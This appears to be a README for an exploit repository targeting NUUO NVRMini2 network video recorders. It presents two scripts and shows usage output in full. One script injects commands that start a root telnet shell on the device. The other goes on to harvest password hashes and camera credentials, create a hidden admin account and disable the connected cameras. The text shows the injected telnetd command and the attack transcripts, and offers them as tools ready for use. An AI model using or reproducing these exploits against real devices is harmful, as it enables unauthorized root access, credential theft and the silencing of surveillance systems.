# NUUO NVRMini2
The two exploits in this repository were tested against the NUUO NVRMini2 versions:

* 03.07.0000.0011
* 03.08.0000.0005

The exploits use the same vulnerability. However, one opens up telnet to give the attacker root access and the other does quite a bit more.

## nvrmini2_enable_telnet.py
This exploit opens telnet up on the remote target. It currently depends on:

* requests

### Usage Example:

```sh
albinolobster@ubuntu:~$ telnet 172.20.10.52
Trying 172.20.10.52...
telnet: connect to address 172.20.10.52: Connection refused
telnet: Unable to connect to remote host
albinolobster@ubuntu:~$ python nvrmini2_enable_telnet.py 172.20.10.52 80
[+] Checking for a valid target...
[+] Valid target!
[+] Executing mount -t devpts devpts /dev/pts on 172.20.10.52:80...
[+] Executing /bin/sh -c "/usr/sbin/telnetd -l /bin/bash -b 0.0.0.0"& on 172.20.10.52:80...
[+] Success!
albinolobster@ubuntu:~$ telnet 172.20.10.52
Trying 172.20.10.52...
Connected to 172.20.10.52.
Escape character is '^]'.

root@test:/NUUO/bin# whoami                                                                                                                                                                      
root
```

## cut.py
This exploit grabs the credentials to the cameras that are connected to the NVR, creates a hidden admin user, and disconnects any cameras that are currently connected to the NVR. It currently depends on:

* requests
* pexpect

### Usage Example:

```sh
albinolobster@ubuntu:~$ python cut.py 172.20.10.52 80
	  ______               __     __ 
	 /      \             /  |   /  |
	/$$$$$$  | __    __  _$$ |_  $$ |
	$$ |  $$/ /  |  /  |/ $$   | $$ |
	$$ |      $$ |  $$ |$$$$$$/  $$ |
	$$ |   __ $$ |  $$ |  $$ | __$$/ 
	$$ \__/  |$$ \__$$ |  $$ |/  |__ 
	$$    $$/ $$    $$/   $$  $$//  |
	 $$$$$$/   $$$$$$/     $$$$/ $$/ 

	Tested on NVRMini2 03.07.0000.0011
	Tested on NVRMini2 03.08.0000.0005

[+] Executing mount -t devpts devpts /dev/pts on 172.20.10.52:80...
[+] Executing /bin/sh -c "/usr/sbin/telnetd -l /bin/bash -b 0.0.0.0"& on 172.20.10.52:80...
Entering telnet session...
[+] Searching for system users and password hashes...
	- root $1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.
	- admin $1$7/O5XJoc$FB42UFJPiUu0hYm4fXMg7.
[+] Target System Information
	- NVR Version: 03.08.0000.0005
	- NVR Release Date: 20180524
	- Kernel: 2.6.31.8
	- Architecture: armv5tel
[+] Searching for remote cameras and creds...
	[1] Generic RTSP @ 172.20.10.240:554 (admin:testpass0)
	[2] Generic RTSP @ 172.20.10.241:554 (admin:testpass1)
[+] Creating hidden admin user (cutv:iddqd)
[+] Logging in as admin user 'cutv'
[+] Login successful
[+] Disabling camera 1
[+] Disabling camera 2
[+] Complete!
```
